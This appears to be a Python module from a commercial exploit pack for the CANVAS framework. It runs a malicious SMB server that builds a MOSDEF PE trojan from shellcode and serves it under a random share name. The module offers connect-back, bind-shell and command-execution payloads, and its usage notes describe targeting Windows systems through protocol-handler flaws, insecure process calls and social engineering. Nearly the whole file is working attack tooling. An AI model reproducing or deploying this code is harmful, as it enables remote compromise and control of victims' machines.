
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################

#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")
import os
import socket
import sys
import time
from struct import *
from threading import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import pelib
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
from smbserver import *
from libs.canvasos import canvasos


######################################################################################
NAME = "SMB Server Backdoor"
DESCRIPTION = "An SMB Server hosting a MOSDEF PE Trojan Backdoor"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION["Notes"] = """
This module does not contain exploit code. This a tool that starts a malicious SMB server which
hosts MOSDEF PE Trojan executables. It may be used for exploiting insecure URL Protocol Handling
or insecure function call (CreateProcess, ShellExecute etc) vulnerabilities - as well as social
engineering situations.

Windows based CANVAS users must first disable the native Windows SMB server before running the module.
On Windows 7 this is done by disabling the 'Server' and 'TCP/IP NetBIOS Helper' services and rebooting
the system.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Servers"

NOTES="""
This module does not contain exploit code. This a tool that starts a malicious SMB server which
hosts MOSDEF PE Trojan executables. It may be used for exploiting insecure URL Protocol Handling
or insecure function call (CreateProcess, ShellExecute etc) vulnerabilities - as well as social
engineering situations.

Windows based CANVAS users must first disable the native Windows SMB server before running the module.
On Windows 7 this is done by disabling the 'Server' and 'TCP/IP NetBIOS Helper' services and rebooting
the system.

WP> White Phosphorus Exploit Pack
WP> SMB Server Backdoor
-----------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)

Versions:
0: Windows Universal

Payloads:
0: TCP Connect Back

Example:
./3rdparty/White_Phosphorus/exploits/wp_smbserver_backdoor/wp_smbserver_backdoor.py  -v0 -t 127.0.0.1 -l 10.1.1.1  -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s###########################################################
    PAYLOADS=["TCP Connect Back",
          "IE Inject Connect Back",
          "HTTPMOSDEF SSL",
          "HTTPMOSDEF PLAIN",
          "Bind MOSDEF Shell",
          "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.use_universal = True
        self.vProtect = True
        self.useRawShellcode = True
        self.sharefilename = "\\" + "".join( [ random.choice(string.lowercase) for x in range(4) ] ) + "\\"+ "".join( [ random.choice(string.lowercase) for x in range(4) ] ) + ".exe"
        return

    def usage(self):
        self.wp_usage(targets)
        return

    def neededListenerTypes(self):
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        # use sharefilename from argsDict if it exists
        if self.argsDict.has_key("sharefilename"):
            self.sharefilename = self.argsDict.get("sharefilename",self.sharefilename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def set_up_smb_server(self):
        self.log("WP> Starting SMB Server on 0.0.0.0:445")
        mysmb = SMBServer('0.0.0.0', 445)
        mysmb.timeout = 30
        
        # Use payload provided by calling module if it exists
        if self.argsDict.has_key("trojanPayload"):
            self.shellcode = self.argsDict.get("trojanPayload")

        self.log("WP> Building MOSDEF PE Trojan")
        myPElib = pelib.PElib()
        try:
            self.mosdeftrojan=myPElib.createPEFileBuf(self.shellcode)
        except Exception, err:
            self.log("WP> Problem building MOSDEF PE Trojan: %s"%(err))
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        mysmb.set_file_data('%s' %(self.sharefilename), self.mosdeftrojan)

        if mysmb.listen()==0:
            self.log("WP> Unable to listen on port 445")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        handledRequest = False

        while True:
            if self.state==self.HALT:
                mysmb.close()
                self.log("WP> SMB: Halted - closing thread 1")
                return True 

            mysmb.timeout=3
            while mysmb.accept() == 0 and self.state != self.HALT:
                self.log("WP> SMB: Awaiting new client")

            if self.state==self.HALT:
                mysmb.close()
                self.log("WP> SMB: Halted - closing thread 2")
                return True

            while mysmb.handle():
                if self.state==self.HALT:
                    mysmb.close()
                    self.log("WP> SMB: Halted - closing thread 3")
                    return True
                self.log("WP> SMB: Handled request")
        return True

    def run(self):
        self.getArgs()
        self.log("WP> Payload located at: \\\\%s%s"%(self.callback.ip,self.sharefilename))
        smb = Thread(target=self.set_up_smb_server)
        smb.start()
        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()